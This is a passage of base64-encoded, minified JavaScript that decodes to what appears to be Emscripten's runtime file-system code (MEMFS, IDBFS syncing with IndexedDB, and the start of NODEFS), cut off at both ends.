FTVBUWSl9fX0KZGVsZXRlIG9sZF9ub2RlLnBhcmVudC5jb250ZW50c1tvbGRfbm9kZS5uYW1lXTtvbGRfbm9kZS5uYW1lPW5ld19uYW1lO25ld19kaXIuY29udGVudHNbbmV3X25hbWVdPW9sZF9ub2RlO29sZF9ub2RlLnBhcmVudD1uZXdfZGlyfSksdW5saW5rOihmdW5jdGlvbihwYXJlbnQsbmFtZSl7ZGVsZXRlIHBhcmVudC5jb250ZW50c1tuYW1lXX0pLHJtZGlyOihmdW5jdGlvbihwYXJlbnQsbmFtZSl7dmFyIG5vZGU9RlMubG9va3VwTm9kZShwYXJlbnQsbmFtZSk7Zm9yKHZhciBpIGluIG5vZGUuY29udGVudHMpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVOT1RFTVBUWSl9CmRlbGV0ZSBwYXJlbnQuY29udGVudHNbbmFtZV19KSxyZWFkZGlyOihmdW5jdGlvbihub2RlKXt2YXIgZW50cmllcz1bIi4iLCIuLiJdO2Zvcih2YXIga2V5IGluIG5vZGUuY29udGVudHMpe2lmKCFub2RlLmNvbnRlbnRzLmhhc093blByb3BlcnR5KGtleSkpe2NvbnRpbnVlfQplbnRyaWVzLnB1c2goa2V5KX0KcmV0dXJuIGVudHJpZXN9KSxzeW1saW5rOihmdW5jdGlvbihwYXJlbnQsbmV3bmFtZSxvbGRwYXRoKXt2YXIgbm9kZT1NRU1GUy5jcmVhdGVOb2RlKHBhcmVudCxuZXduYW1lLDUxMXw0MDk2MCwwKTtub2RlLmxpbms9b2xkcGF0aDtyZXR1cm4gbm9kZX0pLHJlYWRsaW5rOihmdW5jdGlvbihub2RlKXtpZighRlMuaXNMaW5rKG5vZGUubW9kZSkpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVJTlZBTCl9CnJldHVybiBub2RlLmxpbmt9KX0sc3RyZWFtX29wczp7cmVhZDooZnVuY3Rpb24oc3RyZWFtLGJ1ZmZlcixvZmZzZXQsbGVuZ3RoLHBvc2l0aW9uKXt2YXIgY29udGVudHM9c3RyZWFtLm5vZGUuY29udGVudHM7aWYocG9zaXRpb24+PXN0cmVhbS5ub2RlLnVzZWRCeXRlcylyZXR1cm4gMDt2YXIgc2l6ZT1NYXRoLm1pbihzdHJlYW0ubm9kZS51c2VkQnl0ZXMtcG9zaXRpb24sbGVuZ3RoKTthc3NlcnQoc2l6ZT49MCk7aWYoc2l6ZT44JiZjb250ZW50cy5zdWJhcnJheSl7YnVmZmVyLnNldChjb250ZW50cy5zdWJhcnJheShwb3NpdGlvbixwb3NpdGlvbitzaXplKSxvZmZzZXQpfWVsc2V7Zm9yKHZhciBpPTA7aTxzaXplO2krKylidWZmZXJbb2Zmc2V0K2ldPWNvbnRlbnRzW3Bvc2l0aW9uK2ldfQpyZXR1cm4gc2l6ZX0pLHdyaXRlOihmdW5jdGlvbihzdHJlYW0sYnVmZmVyLG9mZnNldCxsZW5ndGgscG9zaXRpb24sY2FuT3duKXtpZighbGVuZ3RoKXJldHVybiAwO3ZhciBub2RlPXN0cmVhbS5ub2RlO25vZGUudGltZXN0YW1wPURhdGUubm93KCk7aWYoYnVmZmVyLnN1YmFycmF5JiYoIW5vZGUuY29udGVudHN8fG5vZGUuY29udGVudHMuc3ViYXJyYXkpKXtpZihjYW5Pd24pe25vZGUuY29udGVudHM9YnVmZmVyLnN1YmFycmF5KG9mZnNldCxvZmZzZXQrbGVuZ3RoKTtub2RlLnVzZWRCeXRlcz1sZW5ndGg7cmV0dXJuIGxlbmd0aH1lbHNlIGlmKG5vZGUudXNlZEJ5dGVzPT09MCYmcG9zaXRpb249PT0wKXtub2RlLmNvbnRlbnRzPW5ldyBVaW50OEFycmF5KGJ1ZmZlci5zdWJhcnJheShvZmZzZXQsb2Zmc2V0K2xlbmd0aCkpO25vZGUudXNlZEJ5dGVzPWxlbmd0aDtyZXR1cm4gbGVuZ3RofWVsc2UgaWYocG9zaXRpb24rbGVuZ3RoPD1ub2RlLnVzZWRCeXRlcyl7bm9kZS5jb250ZW50cy5zZXQoYnVmZmVyLnN1YmFycmF5KG9mZnNldCxvZmZzZXQrbGVuZ3RoKSxwb3NpdGlvbik7cmV0dXJuIGxlbmd0aH19Ck1FTUZTLmV4cGFuZEZpbGVTdG9yYWdlKG5vZGUscG9zaXRpb24rbGVuZ3RoKTtpZihub2RlLmNvbnRlbnRzLnN1YmFycmF5JiZidWZmZXIuc3ViYXJyYXkpbm9kZS5jb250ZW50cy5zZXQoYnVmZmVyLnN1YmFycmF5KG9mZnNldCxvZmZzZXQrbGVuZ3RoKSxwb3NpdGlvbik7ZWxzZXtmb3IodmFyIGk9MDtpPGxlbmd0aDtpKyspe25vZGUuY29udGVudHNbcG9zaXRpb24raV09YnVmZmVyW29mZnNldCtpXX19Cm5vZGUudXNlZEJ5dGVzPU1hdGgubWF4KG5vZGUudXNlZEJ5dGVzLHBvc2l0aW9uK2xlbmd0aCk7cmV0dXJuIGxlbmd0aH0pLGxsc2VlazooZnVuY3Rpb24oc3RyZWFtLG9mZnNldCx3aGVuY2Upe3ZhciBwb3NpdGlvbj1vZmZzZXQ7aWYod2hlbmNlPT09MSl7cG9zaXRpb24rPXN0cmVhbS5wb3NpdGlvbn1lbHNlIGlmKHdoZW5jZT09PTIpe2lmKEZTLmlzRmlsZShzdHJlYW0ubm9kZS5tb2RlKSl7cG9zaXRpb24rPXN0cmVhbS5ub2RlLnVzZWRCeXRlc319CmlmKHBvc2l0aW9uPDApe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVJTlZBTCl9CnJldHVybiBwb3NpdGlvbn0pLGFsbG9jYXRlOihmdW5jdGlvbihzdHJlYW0sb2Zmc2V0LGxlbmd0aCl7TUVNRlMuZXhwYW5kRmlsZVN0b3JhZ2Uoc3RyZWFtLm5vZGUsb2Zmc2V0K2xlbmd0aCk7c3RyZWFtLm5vZGUudXNlZEJ5dGVzPU1hdGgubWF4KHN0cmVhbS5ub2RlLnVzZWRCeXRlcyxvZmZzZXQrbGVuZ3RoKX0pLG1tYXA6KGZ1bmN0aW9uKHN0cmVhbSxidWZmZXIsb2Zmc2V0LGxlbmd0aCxwb3NpdGlvbixwcm90LGZsYWdzKXtpZighRlMuaXNGaWxlKHN0cmVhbS5ub2RlLm1vZGUpKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FTk9ERVYpfQp2YXIgcHRyO3ZhciBhbGxvY2F0ZWQ7dmFyIGNvbnRlbnRzPXN0cmVhbS5ub2RlLmNvbnRlbnRzO2lmKCEoZmxhZ3MmMikmJihjb250ZW50cy5idWZmZXI9PT1idWZmZXJ8fGNvbnRlbnRzLmJ1ZmZlcj09PWJ1ZmZlci5idWZmZXIpKXthbGxvY2F0ZWQ9ITE7cHRyPWNvbnRlbnRzLmJ5dGVPZmZzZXR9ZWxzZXtpZihwb3NpdGlvbj4wfHxwb3NpdGlvbitsZW5ndGg8c3RyZWFtLm5vZGUudXNlZEJ5dGVzKXtpZihjb250ZW50cy5zdWJhcnJheSl7Y29udGVudHM9Y29udGVudHMuc3ViYXJyYXkocG9zaXRpb24scG9zaXRpb24rbGVuZ3RoKX1lbHNle2NvbnRlbnRzPUFycmF5LnByb3RvdHlwZS5zbGljZS5jYWxsKGNvbnRlbnRzLHBvc2l0aW9uLHBvc2l0aW9uK2xlbmd0aCl9fQphbGxvY2F0ZWQ9ITA7cHRyPV9tYWxsb2MobGVuZ3RoKTtpZighcHRyKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FTk9NRU0pfQpidWZmZXIuc2V0KGNvbnRlbnRzLHB0cil9CnJldHVybntwdHI6cHRyLGFsbG9jYXRlZDphbGxvY2F0ZWR9fSksbXN5bmM6KGZ1bmN0aW9uKHN0cmVhbSxidWZmZXIsb2Zmc2V0LGxlbmd0aCxtbWFwRmxhZ3Mpe2lmKCFGUy5pc0ZpbGUoc3RyZWFtLm5vZGUubW9kZSkpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVOT0RFVil9CmlmKG1tYXBGbGFncyYyKXtyZXR1cm4gMH0KdmFyIGJ5dGVzV3JpdHRlbj1NRU1GUy5zdHJlYW1fb3BzLndyaXRlKHN0cmVhbSxidWZmZXIsMCxsZW5ndGgsb2Zmc2V0LCExKTtyZXR1cm4gMH0pfX07dmFyIElEQkZTPXtkYnM6e30saW5kZXhlZERCOihmdW5jdGlvbigpe2lmKHR5cGVvZiBpbmRleGVkREIhPT0idW5kZWZpbmVkIilyZXR1cm4gaW5kZXhlZERCO3ZhciByZXQ9bnVsbDtpZih0eXBlb2Ygd2luZG93PT09Im9iamVjdCIpcmV0PXdpbmRvdy5pbmRleGVkREJ8fHdpbmRvdy5tb3pJbmRleGVkREJ8fHdpbmRvdy53ZWJraXRJbmRleGVkREJ8fHdpbmRvdy5tc0luZGV4ZWREQjthc3NlcnQocmV0LCJJREJGUyB1c2VkLCBidXQgaW5kZXhlZERCIG5vdCBzdXBwb3J0ZWQiKTtyZXR1cm4gcmV0fSksREJfVkVSU0lPTjoyMSxEQl9TVE9SRV9OQU1FOiJGSUxFX0RBVEEiLG1vdW50OihmdW5jdGlvbihtb3VudCl7cmV0dXJuIE1FTUZTLm1vdW50LmFwcGx5KG51bGwsYXJndW1lbnRzKX0pLHN5bmNmczooZnVuY3Rpb24obW91bnQscG9wdWxhdGUsY2FsbGJhY2spe0lEQkZTLmdldExvY2FsU2V0KG1vdW50LChmdW5jdGlvbihlcnIsbG9jYWwpe2lmKGVycilyZXR1cm4gY2FsbGJhY2soZXJyKTtJREJGUy5nZXRSZW1vdGVTZXQobW91bnQsKGZ1bmN0aW9uKGVycixyZW1vdGUpe2lmKGVycilyZXR1cm4gY2FsbGJhY2soZXJyKTt2YXIgc3JjPXBvcHVsYXRlP3JlbW90ZTpsb2NhbDt2YXIgZHN0PXBvcHVsYXRlP2xvY2FsOnJlbW90ZTtJREJGUy5yZWNvbmNpbGUoc3JjLGRzdCxjYWxsYmFjayl9KSl9KSl9KSxnZXREQjooZnVuY3Rpb24obmFtZSxjYWxsYmFjayl7dmFyIGRiPUlEQkZTLmRic1tuYW1lXTtpZihkYil7cmV0dXJuIGNhbGxiYWNrKG51bGwsZGIpfQp2YXIgcmVxO3RyeXtyZXE9SURCRlMuaW5kZXhlZERCKCkub3BlbihuYW1lLElEQkZTLkRCX1ZFUlNJT04pfWNhdGNoKGUpe3JldHVybiBjYWxsYmFjayhlKX0KaWYoIXJlcSl7cmV0dXJuIGNhbGxiYWNrKCJVbmFibGUgdG8gY29ubmVjdCB0byBJbmRleGVkREIiKX0KcmVxLm9udXBncmFkZW5lZWRlZD0oZnVuY3Rpb24oZSl7dmFyIGRiPWUudGFyZ2V0LnJlc3VsdDt2YXIgdHJhbnNhY3Rpb249ZS50YXJnZXQudHJhbnNhY3Rpb247dmFyIGZpbGVTdG9yZTtpZihkYi5vYmplY3RTdG9yZU5hbWVzLmNvbnRhaW5zKElEQkZTLkRCX1NUT1JFX05BTUUpKXtmaWxlU3RvcmU9dHJhbnNhY3Rpb24ub2JqZWN0U3RvcmUoSURCRlMuREJfU1RPUkVfTkFNRSl9ZWxzZXtmaWxlU3RvcmU9ZGIuY3JlYXRlT2JqZWN0U3RvcmUoSURCRlMuREJfU1RPUkVfTkFNRSl9CmlmKCFmaWxlU3RvcmUuaW5kZXhOYW1lcy5jb250YWlucygidGltZXN0YW1wIikpe2ZpbGVTdG9yZS5jcmVhdGVJbmRleCgidGltZXN0YW1wIiwidGltZXN0YW1wIix7dW5pcXVlOiExfSl9fSk7cmVxLm9uc3VjY2Vzcz0oZnVuY3Rpb24oKXtkYj1yZXEucmVzdWx0O0lEQkZTLmRic1tuYW1lXT1kYjtjYWxsYmFjayhudWxsLGRiKX0pO3JlcS5vbmVycm9yPShmdW5jdGlvbihlKXtjYWxsYmFjayh0aGlzLmVycm9yKTtlLnByZXZlbnREZWZhdWx0KCl9KX0pLGdldExvY2FsU2V0OihmdW5jdGlvbihtb3VudCxjYWxsYmFjayl7dmFyIGVudHJpZXM9e307ZnVuY3Rpb24gaXNSZWFsRGlyKHApe3JldHVybiBwIT09Ii4iJiZwIT09Ii4uIn0KZnVuY3Rpb24gdG9BYnNvbHV0ZShyb290KXtyZXR1cm4oZnVuY3Rpb24ocCl7cmV0dXJuIFBBVEguam9pbjIocm9vdCxwKX0pfQp2YXIgY2hlY2s9RlMucmVhZGRpcihtb3VudC5tb3VudHBvaW50KS5maWx0ZXIoaXNSZWFsRGlyKS5tYXAodG9BYnNvbHV0ZShtb3VudC5tb3VudHBvaW50KSk7d2hpbGUoY2hlY2subGVuZ3RoKXt2YXIgcGF0aD1jaGVjay5wb3AoKTt2YXIgc3RhdDt0cnl7c3RhdD1GUy5zdGF0KHBhdGgpfWNhdGNoKGUpe3JldHVybiBjYWxsYmFjayhlKX0KaWYoRlMuaXNEaXIoc3RhdC5tb2RlKSl7Y2hlY2sucHVzaC5hcHBseShjaGVjayxGUy5yZWFkZGlyKHBhdGgpLmZpbHRlcihpc1JlYWxEaXIpLm1hcCh0b0Fic29sdXRlKHBhdGgpKSl9CmVudHJpZXNbcGF0aF09e3RpbWVzdGFtcDpzdGF0Lm10aW1lfX0KcmV0dXJuIGNhbGxiYWNrKG51bGwse3R5cGU6ImxvY2FsIixlbnRyaWVzOmVudHJpZXN9KX0pLGdldFJlbW90ZVNldDooZnVuY3Rpb24obW91bnQsY2FsbGJhY2spe3ZhciBlbnRyaWVzPXt9O0lEQkZTLmdldERCKG1vdW50Lm1vdW50cG9pbnQsKGZ1bmN0aW9uKGVycixkYil7aWYoZXJyKXJldHVybiBjYWxsYmFjayhlcnIpO3ZhciB0cmFuc2FjdGlvbj1kYi50cmFuc2FjdGlvbihbSURCRlMuREJfU1RPUkVfTkFNRV0sInJlYWRvbmx5Iik7dHJhbnNhY3Rpb24ub25lcnJvcj0oZnVuY3Rpb24oZSl7Y2FsbGJhY2sodGhpcy5lcnJvcik7ZS5wcmV2ZW50RGVmYXVsdCgpfSk7dmFyIHN0b3JlPXRyYW5zYWN0aW9uLm9iamVjdFN0b3JlKElEQkZTLkRCX1NUT1JFX05BTUUpO3ZhciBpbmRleD1zdG9yZS5pbmRleCgidGltZXN0YW1wIik7aW5kZXgub3BlbktleUN1cnNvcigpLm9uc3VjY2Vzcz0oZnVuY3Rpb24oZXZlbnQpe3ZhciBjdXJzb3I9ZXZlbnQudGFyZ2V0LnJlc3VsdDtpZighY3Vyc29yKXtyZXR1cm4gY2FsbGJhY2sobnVsbCx7dHlwZToicmVtb3RlIixkYjpkYixlbnRyaWVzOmVudHJpZXN9KX0KZW50cmllc1tjdXJzb3IucHJpbWFyeUtleV09e3RpbWVzdGFtcDpjdXJzb3Iua2V5fTtjdXJzb3IuY29udGludWUoKX0pfSkpfSksbG9hZExvY2FsRW50cnk6KGZ1bmN0aW9uKHBhdGgsY2FsbGJhY2spe3ZhciBzdGF0LG5vZGU7dHJ5e3ZhciBsb29rdXA9RlMubG9va3VwUGF0aChwYXRoKTtub2RlPWxvb2t1cC5ub2RlO3N0YXQ9RlMuc3RhdChwYXRoKX1jYXRjaChlKXtyZXR1cm4gY2FsbGJhY2soZSl9CmlmKEZTLmlzRGlyKHN0YXQubW9kZSkpe3JldHVybiBjYWxsYmFjayhudWxsLHt0aW1lc3RhbXA6c3RhdC5tdGltZSxtb2RlOnN0YXQubW9kZX0pfWVsc2UgaWYoRlMuaXNGaWxlKHN0YXQubW9kZSkpe25vZGUuY29udGVudHM9TUVNRlMuZ2V0RmlsZURhdGFBc1R5cGVkQXJyYXkobm9kZSk7cmV0dXJuIGNhbGxiYWNrKG51bGwse3RpbWVzdGFtcDpzdGF0Lm10aW1lLG1vZGU6c3RhdC5tb2RlLGNvbnRlbnRzOm5vZGUuY29udGVudHN9KX1lbHNle3JldHVybiBjYWxsYmFjayhuZXcgRXJyb3IoIm5vZGUgdHlwZSBub3Qgc3VwcG9ydGVkIikpfX0pLHN0b3JlTG9jYWxFbnRyeTooZnVuY3Rpb24ocGF0aCxlbnRyeSxjYWxsYmFjayl7dHJ5e2lmKEZTLmlzRGlyKGVudHJ5Lm1vZGUpKXtGUy5ta2RpcihwYXRoLGVudHJ5Lm1vZGUpfWVsc2UgaWYoRlMuaXNGaWxlKGVudHJ5Lm1vZGUpKXtGUy53cml0ZUZpbGUocGF0aCxlbnRyeS5jb250ZW50cyx7ZW5jb2Rpbmc6ImJpbmFyeSIsY2FuT3duOiEwfSl9ZWxzZXtyZXR1cm4gY2FsbGJhY2sobmV3IEVycm9yKCJub2RlIHR5cGUgbm90IHN1cHBvcnRlZCIpKX0KRlMuY2htb2QocGF0aCxlbnRyeS5tb2RlKTtGUy51dGltZShwYXRoLGVudHJ5LnRpbWVzdGFtcCxlbnRyeS50aW1lc3RhbXApfWNhdGNoKGUpe3JldHVybiBjYWxsYmFjayhlKX0KY2FsbGJhY2sobnVsbCl9KSxyZW1vdmVMb2NhbEVudHJ5OihmdW5jdGlvbihwYXRoLGNhbGxiYWNrKXt0cnl7dmFyIGxvb2t1cD1GUy5sb29rdXBQYXRoKHBhdGgpO3ZhciBzdGF0PUZTLnN0YXQocGF0aCk7aWYoRlMuaXNEaXIoc3RhdC5tb2RlKSl7RlMucm1kaXIocGF0aCl9ZWxzZSBpZihGUy5pc0ZpbGUoc3RhdC5tb2RlKSl7RlMudW5saW5rKHBhdGgpfX1jYXRjaChlKXtyZXR1cm4gY2FsbGJhY2soZSl9CmNhbGxiYWNrKG51bGwpfSksbG9hZFJlbW90ZUVudHJ5OihmdW5jdGlvbihzdG9yZSxwYXRoLGNhbGxiYWNrKXt2YXIgcmVxPXN0b3JlLmdldChwYXRoKTtyZXEub25zdWNjZXNzPShmdW5jdGlvbihldmVudCl7Y2FsbGJhY2sobnVsbCxldmVudC50YXJnZXQucmVzdWx0KX0pO3JlcS5vbmVycm9yPShmdW5jdGlvbihlKXtjYWxsYmFjayh0aGlzLmVycm9yKTtlLnByZXZlbnREZWZhdWx0KCl9KX0pLHN0b3JlUmVtb3RlRW50cnk6KGZ1bmN0aW9uKHN0b3JlLHBhdGgsZW50cnksY2FsbGJhY2spe3ZhciByZXE9c3RvcmUucHV0KGVudHJ5LHBhdGgpO3JlcS5vbnN1Y2Nlc3M9KGZ1bmN0aW9uKCl7Y2FsbGJhY2sobnVsbCl9KTtyZXEub25lcnJvcj0oZnVuY3Rpb24oZSl7Y2FsbGJhY2sodGhpcy5lcnJvcik7ZS5wcmV2ZW50RGVmYXVsdCgpfSl9KSxyZW1vdmVSZW1vdGVFbnRyeTooZnVuY3Rpb24oc3RvcmUscGF0aCxjYWxsYmFjayl7dmFyIHJlcT1zdG9yZS5kZWxldGUocGF0aCk7cmVxLm9uc3VjY2Vzcz0oZnVuY3Rpb24oKXtjYWxsYmFjayhudWxsKX0pO3JlcS5vbmVycm9yPShmdW5jdGlvbihlKXtjYWxsYmFjayh0aGlzLmVycm9yKTtlLnByZXZlbnREZWZhdWx0KCl9KX0pLHJlY29uY2lsZTooZnVuY3Rpb24oc3JjLGRzdCxjYWxsYmFjayl7dmFyIHRvdGFsPTA7dmFyIGNyZWF0ZT1bXTtPYmplY3Qua2V5cyhzcmMuZW50cmllcykuZm9yRWFjaCgoZnVuY3Rpb24oa2V5KXt2YXIgZT1zcmMuZW50cmllc1trZXldO3ZhciBlMj1kc3QuZW50cmllc1trZXldO2lmKCFlMnx8ZS50aW1lc3RhbXA+ZTIudGltZXN0YW1wKXtjcmVhdGUucHVzaChrZXkpO3RvdGFsKyt9fSkpO3ZhciByZW1vdmU9W107T2JqZWN0LmtleXMoZHN0LmVudHJpZXMpLmZvckVhY2goKGZ1bmN0aW9uKGtleSl7dmFyIGU9ZHN0LmVudHJpZXNba2V5XTt2YXIgZTI9c3JjLmVudHJpZXNba2V5XTtpZighZTIpe3JlbW92ZS5wdXNoKGtleSk7dG90YWwrK319KSk7aWYoIXRvdGFsKXtyZXR1cm4gY2FsbGJhY2sobnVsbCl9CnZhciBjb21wbGV0ZWQ9MDt2YXIgZGI9c3JjLnR5cGU9PT0icmVtb3RlIj9zcmMuZGI6ZHN0LmRiO3ZhciB0cmFuc2FjdGlvbj1kYi50cmFuc2FjdGlvbihbSURCRlMuREJfU1RPUkVfTkFNRV0sInJlYWR3cml0ZSIpO3ZhciBzdG9yZT10cmFuc2FjdGlvbi5vYmplY3RTdG9yZShJREJGUy5EQl9TVE9SRV9OQU1FKTtmdW5jdGlvbiBkb25lKGVycil7aWYoZXJyKXtpZighZG9uZS5lcnJvcmVkKXtkb25lLmVycm9yZWQ9ITA7cmV0dXJuIGNhbGxiYWNrKGVycil9CnJldHVybn0KaWYoKytjb21wbGV0ZWQ+PXRvdGFsKXtyZXR1cm4gY2FsbGJhY2sobnVsbCl9fQp0cmFuc2FjdGlvbi5vbmVycm9yPShmdW5jdGlvbihlKXtkb25lKHRoaXMuZXJyb3IpO2UucHJldmVudERlZmF1bHQoKX0pO2NyZWF0ZS5zb3J0KCkuZm9yRWFjaCgoZnVuY3Rpb24ocGF0aCl7aWYoZHN0LnR5cGU9PT0ibG9jYWwiKXtJREJGUy5sb2FkUmVtb3RlRW50cnkoc3RvcmUscGF0aCwoZnVuY3Rpb24oZXJyLGVudHJ5KXtpZihlcnIpcmV0dXJuIGRvbmUoZXJyKTtJREJGUy5zdG9yZUxvY2FsRW50cnkocGF0aCxlbnRyeSxkb25lKX0pKX1lbHNle0lEQkZTLmxvYWRMb2NhbEVudHJ5KHBhdGgsKGZ1bmN0aW9uKGVycixlbnRyeSl7aWYoZXJyKXJldHVybiBkb25lKGVycik7SURCRlMuc3RvcmVSZW1vdGVFbnRyeShzdG9yZSxwYXRoLGVudHJ5LGRvbmUpfSkpfX0pKTtyZW1vdmUuc29ydCgpLnJldmVyc2UoKS5mb3JFYWNoKChmdW5jdGlvbihwYXRoKXtpZihkc3QudHlwZT09PSJsb2NhbCIpe0lEQkZTLnJlbW92ZUxvY2FsRW50cnkocGF0aCxkb25lKX1lbHNle0lEQkZTLnJlbW92ZVJlbW90ZUVudHJ5KHN0b3JlLHBhdGgsZG9uZSl9fSkpfSl9O3ZhciBOT0RFRlM9e2lzV2luZG93czohMSxzdGF0aWNJbml0OihmdW5jdGlvbigpe05PREVGUy5pc1dpbmRvd3M9ISFwcm9jZXNzLnBsYXRmb3JtLm1hdGNoKC9ed2luLyl9KSxtb3VudDooZnVuY3Rpb24obW91bnQpe2Fzc2VydChFTlZJUk9OTUVOVF9JU19OT0RFKTtyZXR1cm4gTk9ERUZTLmNyZWF0ZU5vZGUobnVsbCwiLyIsTk9ERUZTLmdldE1vZGUobW91bnQub3B0cy5yb290KSwwKX0pLGNyZWF0ZU5vZGU6KGZ1bmN0aW9uKHBhcmVudCxuYW1lLG1vZGUsZGV2KXtpZighRlMuaXNEaXIobW9kZSkmJiFGUy5pc0ZpbGUobW9kZSkmJiFGUy5pc0xpbmsobW9kZSkpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVJTlZBTCl9CnZhciBub2RlPUZTLmNyZWF0ZU5vZGUocGFyZW50LG5hbWUsbW9kZSk7bm9kZS5ub2RlX29wcz1OT0RFRlMubm9kZV9vcHM7bm9kZS5zdHJlYW1fb3BzPU5PREVGUy5zdHJlYW1fb3BzO3JldHVybiBub2RlfSksZ2V0TW9kZTooZnVuY3Rpb24ocGF0aCl7dmFyIHN0YXQ7dHJ5e3N0YXQ9ZnMubHN0YXRTeW5jKHBhdGgpO2lmKE5PREVGUy5pc1dpbmRvd3Mpe3N0YXQubW9kZT1zdGF0Lm1vZGV8KHN0YXQubW9kZSYxNDYpPj4xfX1jYXRjaChlKXtpZighZS5jb2RlKXRocm93IGU7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVNbZS5jb2RlXSl9CnJldHVybiBzdGF0Lm1vZGV9KSxyZWFsUGF0aDooZnVuY3Rpb24obm9kZSl7dmFyIHBhcnRzPVtdO3doaWxlKG5vZGUucGFyZW50IT09bm9kZSl7cGFydHMucHVzaChub2RlLm5hbWUpO25vZGU9bm9kZS5wYXJlbnR9CnBhcnRzLnB1c2gobm9kZS5tb3VudC5vcHRzLnJvb3QpO3BhcnRzLnJldmVyc2UoKTtyZXR1cm4gUEFUSC5qb2luLmFwcGx5KG51bGwscGFydHMpfSksZmxhZ3NUb1Blcm1pc3Npb25TdHJpbmdNYXA6ezA6InIiLDE6InIrIiwyOiJyKyIsNjQ6InIiLDY1OiJyKyIsNjY6InIrIiwxMjk6InJ4KyIsMTkzOiJyeCsiLDUxNDoidysiLDU3NzoidyIsNTc4OiJ3KyIsNzA1OiJ3eCIsNzA2OiJ3eCsiLDEwMjQ6ImEiLDEwMjU6ImEiLDEwMjY6ImErIiwxMDg5OiJhIiwxMDkwOiJhKyIsMTE1MzoiYXgiLDExNTQ6ImF4KyIsMTIxNzoiYXgiLDEyMTg6ImF4KyIsNDA5NjoicnMiLDQwOTg6InJzKyJ9LGZsYWdzVG9QZXJtaXNzaW9uU3RyaW5nOihmdW5jdGlvbihmbGFncyl7ZmxhZ3MmPX4yMDk3MTUyO2ZsYWdzJj1+MjA0ODtmbGFncyY9fjMyNzY4O2ZsYWdzJj1+NTI0Mjg4O2lmKGZsYWdzIGluIE5PREVGUy5mbGFnc1RvUGVybWlzc2lvblN0cmluZ01hcCl7cmV0dXJuIE5PREVGUy5mbGFnc1RvUGVybWlzc2lvblN0cmluZ01hcFtmbGFnc119ZWxzZXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FSU5WQUwpfX0pLG5vZGVfb3BzOntnZXRhdHRyOihmdW5jdGlvbihub2RlKXt2YXIgcGF0aD1OT0RFRlMucmVhbFBhdGgobm9kZSk7dmFyIHN0YXQ7dHJ5e3N0YXQ9ZnMubHN0YXRTeW5jKHBhdGgpfWNhdGNoKGUpe2lmKCFlLmNvZGUpdGhyb3cgZTt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFU1tlLmNvZGVdKX0KaWYoTk9ERUZTLmlzV2luZG93cyYmIXN0YXQuYmxrc2l6ZSl7c3RhdC5ibGtzaXplPTQwOTZ9CmlmKE5PREVGUy5pc1dpbmRvd3MmJiFzdGF0LmJsb2Nrcyl7c3RhdC5ibG9ja3M9KHN0YXQuc2l6ZStzdGF0LmJsa3NpemUtMSkvc3RhdC5ibGtzaXplfDB9CnJldHVybntkZXY6c3RhdC5kZXYsaW5vOnN0YXQuaW5vLG1vZGU6c3RhdC5tb2RlLG5saW5rOnN0YXQubmxpbmssdWlkOnN0YXQudWlkLGdpZDpzdGF0LmdpZCxyZGV2OnN0YXQucmRldixzaXplOnN0YXQuc2l6ZSxhdGltZTpzdGF0LmF0aW1lLG10aW1lOnN0YXQubXRpbWUsY3RpbWU6c3RhdC5jdGltZSxibGtzaXplOnN0YXQuYmxrc2l6ZSxibG9ja3M6c3RhdC5ibG9ja3N9fSksc2V0YXR0cjooZnVuY3Rpb24obm9kZSxhdHRyKXt2YXIgcGF0aD1OT0RFRlMucmVhbFBhdGgobm9kZSk7dHJ5e2lmKGF0dHIubW9kZSE9PXVuZGVmaW5lZCl7ZnMuY2htb2RTeW5jKHBhdGgsYXR0ci5tb2RlKTtub2RlLm1vZGU9YXR0ci5tb2RlfQppZihhdHRyLnRpbWVzdGFtcCE9PXVuZGVmaW5lZCl7dmFyIGRhdGU9bmV3IERhdGUoYXR0ci50aW1lc3RhbXApO2ZzLnV0aW1lc1N5bmMocGF0aCxkYXRlLGRhdGUpfQppZihhdHRyLnNpemUhPT11bmRlZmluZWQpe2ZzLnRydW5jYXRlU3luYyhwYXRoLGF0dHIuc2l6ZSl9fWNhdGNoKGUpe2lmKCFlLmNvZGUpdGhyb3cgZTt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFU1tlLmNvZGVdKX19KSxsb29rdXA6KGZ1bmN0aW9uKHBhcmVudCxuYW1lKXt2YXIgcGF0aD1QQVRILmpvaW4yKE5PREVGUy5yZWFsUGF0aChwYXJlbnQpLG5hbWUpO3ZhciBtb2RlPU5PREVGUy5nZXRNb2RlKHBhdGgpO3JldHVybiBOT0RFRlMuY3JlYXRlTm9kZShwYXJlbnQsbmFtZSxtb2RlKX0pLG1rbm9kOihmdW5jdGlvbihwYXJlbnQsbmFtZSxtb2RlLGRldil7dmFyIG5vZGU9Tk9ERUZTLmNyZWF0ZU5vZGUocGFyZW50LG5hbWUsbW9kZSxkZXYpO3ZhciBwYXRoPU5PREVGUy5yZWFsUGF0aChub2RlKTt0cnl7aWYoRlMuaXNEaXIobm9kZS5tb2RlKSl7ZnMubWtkaXJTeW5jKHBhdGgsbm9kZS5tb2RlKX1lbHNle2ZzLndyaXRlRmlsZVN5bmMocGF0aCwiIix7bW9kZTpub2RlLm1vZGV9KX19Y2F0Y2goZSl7aWYoIWUuY29kZSl0aHJvdyBlO3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTW2UuY29kZV0pfQpyZXR1cm4gbm9kZX0pLHJlbmFtZTooZnVuY3Rpb24ob2xkTm9kZSxuZXdEaXIsbmV3TmFtZSl7dmFyIG9sZFBhdGg9Tk9ERUZTLnJlYWxQYXRoKG9sZE5vZGUpO3ZhciBuZXdQYXRoPVBBVEguam9pbjIoTk9ERUZTLnJlYWxQYXRoKG5ld0RpciksbmV3TmFtZSk7dHJ5e2ZzLnJlbmFt